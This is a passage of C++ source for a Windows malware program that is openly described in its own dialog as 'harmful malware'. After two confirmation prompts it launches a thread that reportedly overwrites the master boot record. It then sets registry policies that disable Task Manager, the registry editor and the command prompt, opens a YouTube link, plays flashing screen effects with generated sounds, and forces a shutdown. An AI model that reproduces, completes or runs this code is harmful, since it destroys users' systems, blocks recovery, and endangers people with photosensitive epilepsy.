	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ t * (t >> 7 & t >> 8)) * t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t / 8 * (t >> 3 & t >> 8 & t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(9 * (t >> 3 & t >> 6 & t * t) * (t >> 4 & t >> 8));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
void reg_add( //credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
	HKEY HKey,
	LPCWSTR Subkey,
	LPCWSTR ValueName,
	unsigned long Type,
	unsigned int Value
)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;


	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);

	RegCloseKey(hKey);
	return;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"This is a harmful malware made by anotheraccount\n\nClick yes to Run\nClick no to Exit", L"DTMP.exe (Remember, don't touch his pizza...)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It will overwrite the boot record and it contains flashing lights - NOT for epilepsy and it will open a youtube link!", L"FINAL WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			Sleep(100);
			//ShellExecuteA(0, 0, L"https://www.youtube.com/watch?v=W7RjYUYKV8g", 0, 0, SW_SHOW); does not work
			std::string youtubeLink = "https://www.youtube.com/watch?v=451XC5PigRY"; // Or any other YouTube link
			std::string command = "start " + youtubeLink; // Use "start" for Windows
			std::system(command.c_str());
			Sleep(5000);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);//shader1
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);//shader2
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);//shader3
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);//shader4
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);//shader5
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			ShellExecuteA(NULL, NULL, "shutdown", "/s", NULL, SW_SHOWDEFAULT);
			HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);//shader6
			sound6();
			Sleep(30000);
		}
	}
}
